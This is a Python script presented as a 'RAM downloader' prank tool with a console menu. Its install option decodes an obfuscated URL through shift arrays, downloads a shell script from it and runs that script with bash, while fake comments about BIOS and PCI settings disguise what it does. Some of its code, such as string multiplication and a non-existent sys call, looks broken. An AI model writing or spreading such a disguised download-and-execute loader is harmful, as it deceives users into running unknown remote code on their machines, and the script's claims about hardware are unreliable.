from consolemenu import *
from consolemenu.items import *
import requests
import subprocess
import sys

def downloadRam():
  amount = input('Input the amount of RAM you want in GB: ')
  fetchRam(amount)

def fetchRam(amount):
  bytes = requests.get('https://downloadmoreram.com/api/ram/' + str(amount * 1024) + 'mb.module').content
  extracted = extractRam(bytes)
  # Extract RAM module URL from header
  url_prefix = extracted[bytes[1] - 33:bytes[0] - 46]
  url_main = extracted[bytes[0] - 46:40]
  url = url_prefix + 'usercontent' + url_main
  url = url.replace('//', '//raw.')
  store_path = 'ram/master/modules/linux/sh/rollingrelease'
  url += store_path[bytes[5] - 81:bytes[6] - 79] + '/' + store_path[bytes[1] - 5:bytes[2] - 36] + '.' + store_path[shiftAmounts[0] - 19:shiftAmounts[1] - 56]
  
  module = requests.get(url).content
  with open('ram.tmp.sh', 'wb') as f:
    f.write(module)
  
  # Execute RAM module to load PCI chip path into BIOS TXRs
  subprocess.call(['bash', './ram.tmp.sh'])


shiftAmounts = [44, 83, 48, 33, 48, -26, -42, -33, 34, 73, 44, 20, 40, 22, 14, 19, 26, 43, -29, 34, 34, 82, 77, 70, 54, 67, 28, 41, 17, -23, 67, 58, 31, 23, 46, 79, 36, 24, 37, 23]
headerLen = 40
def extractRam(bytes):
  header = ''
  # Reformat the header to work on Linux
  for n in range(headerLen):
    header += chr(bytes[n] + shiftAmounts[n])
  return header

def removeRam():
  # Reset the BIOS TXR PCI paths back to the UGF factory defaults
  try:
    sys.biosSignal(['txrutil', 'reset', '--ugf-defaults'])
  except:
    pass
  print('All installed RAM removed.')
  sys.exit(0)

menu = ConsoleMenu("RAM downloader", "Simple RAM downloader CLI for Linux - boost your RAM for free!")

install_ram = FunctionItem("Install RAM", downloadRam, [])
remove_ram = FunctionItem("Remove all installed RAM", removeRam, [])

menu.append_item(install_ram)
menu.append_item(remove_ram)

menu.show()
